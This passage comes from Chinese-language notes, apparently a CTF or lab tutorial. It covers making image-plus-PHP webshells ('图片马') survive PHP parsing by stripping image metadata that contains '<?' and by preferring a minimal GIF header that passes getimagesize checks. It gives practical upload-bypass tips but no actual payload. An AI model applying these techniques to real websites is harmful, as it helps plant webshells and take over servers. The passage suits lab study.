> 真图片 + `.php` 后缀是**危险组合**。GIF/JPEG 的 XMP、EXIF、ICC 元数据里出现 `<?` 是常态，配上 `short_open_tag=On` 就会让 PHP 把二进制当代码解析。**只要文件会被当 PHP 解析（`.php` 后缀或被 include），就必须保证 `<?php` 之前没有别的 `<?`。**

#### 第 5 步：如果必须用真图片（比如校验要求可解码）
操作：优先剥离元数据，或换一个不含 `<?` 的图。
```bash
# 重新编码，去掉绝大多数元数据（ImageMagick）
convert original.png -strip clean.gif
node -e "const s=require('fs').readFileSync('clean.gif').toString('latin1');console.log('含 <? 次数:',(s.match(/<\?/g)||[]).length)"
# 仍不为 0 就换图，或改用「GIF头 + 纯PHP」方案
```
- 预期结果：绝大多数情况下 `-strip` 能把 `<?` 降到 0。
- 如果不行：图片本身内容里就有该序列 → 换一张图，或退回第 4 步的最小 GIF 方案。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `Parse error: unexpected 'xxx'` 且单词没见过 | 二进制里的 `<?` 提前开了代码模式 | 第 3 步扫描定位，第 4 步造干净文件 |
| 报错在 line 1 | 二进制里没有换行，所有内容都算第一行 | 正常，别纠结行号 |
| 内容校验不查真图，却用了真图片马 | 照搬了"图片马"的做法 | 内容只查文件头时，直接用干净 GIF 头 + PHP |
| 文件执行但 payload 没结果 | 崩在 payload 之前 | 同上，先消除二进制里的 `<?` |
| 本机拼不出 `printf` 的二进制 | shell 转义问题 | 用 `node -e "fs.writeFileSync(...,Buffer.from([...]))"` 更可控 |

#### 实战要点
- **报错信息是最好的老师**：`unexpected 'begin'` 里的每个词都是线索，`begin` 是 Pascal 关键字，出现说明它来自外部数据（XMP/XML），顺着找一下就定位了。
- **"文件被执行了"和"payload 跑了"是两件事**——语法错误说明前者成立后者失败，这本身是重要进展。
- **优先用最小 GIF 方案**：字节可审计、无元数据噪音，成本最低。
- 真图片马仅在校验要求"能解码出真实图像"时才需要；多数 `getimagesize` 只读文件头，最小 GIF 足够。
- 拼接后**永远跑一次 `<?` 计数**，5 秒钟换一个确定性。

> [!tip] 拼完图片马先数一下 `<?` 出现次数：应当**恰好等于你自己 payload 的数量**。多了就说明图片元数据里混进了开标签，必须处理。

> [!warn] 真图片的 XMP 元数据（Photoshop 存图常带）里有 `<?xpacket begin=`，这是"图片马 + .php 后缀"最经典的崩溃源。核心原因：`.php` 后缀下 PHP 解析的是**整个文件**，而不是只有 `<?php` 之后的部分。
